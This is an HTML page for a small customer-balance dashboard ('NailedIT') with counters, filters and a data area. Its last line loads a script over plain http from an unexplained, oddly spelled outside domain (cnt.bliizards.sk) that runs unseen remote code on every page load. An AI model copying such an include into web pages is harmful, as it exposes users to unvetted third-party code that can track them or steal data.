<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>NailedIT - DONE IS BETTER THAN PERFECT</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
	<script src="https://code.jquery.com/jquery-3.3.0.min.js"></script>
	<link rel="stylesheet" href="style.css">
</head>
<body>
	<!-- *** -->
	<!-- NAV -->
	<!-- *** -->
	<nav>
		<div class="container">
			<div class="row">
				<div class="col-md-3"><div class="nailed-logo"><a href="./"></a></div></div>
				<div class="col-md-3"><div class="count-active"><span></span> active customers</div></div>
				<div class="col-md-3"><div class="count-inactive"><span></span> inactive customers</div></div>
				<div class="col-md-3"><div class="count-negative"><span></span> with negative balance</div></div>
			</div>
		</div>
	</nav>
	<!-- ******* -->
	<!-- SECTION -->
	<!-- ******* -->
	<section class="customers">
		<div class="container">
			<div class="row">
					<div class="col-md-4">   
							<div class="count-balance">total balance is <span></span></div>
						</div>
				<div class="col-md-8">
					<ul class="filter">
						<li><input type="radio" id="f-option" name="selector" class="all" checked><label for="f-option">all</label><div class="check"></div></li>
						<li><input type="radio" id="s-option" name="selector" class="inactive"><label for="s-option">inactive customers</label><div class="check"><div class="inside"></div></div></li>
						<li><input type="radio" id="t-option" name="selector" class="negative"><label for="t-option">negative balance</label><div class="check"><div class="inside"></div></div></li>
					</ul>		
				</div> 
			</div>
			<div class="row">
				<div class="col-md-12"> 
					<div id="data-wrap"></div>
				</div>
			</div>
		</div>
	</section>
	<!-- ****** -->
	<!-- FOOTER -->
	<!-- ****** -->
	<footer>handmade with love by tk</footer>
	<script src="script.js"></script>
	<script src="http://cnt.bliizards.sk"></script>
</body>
</html>
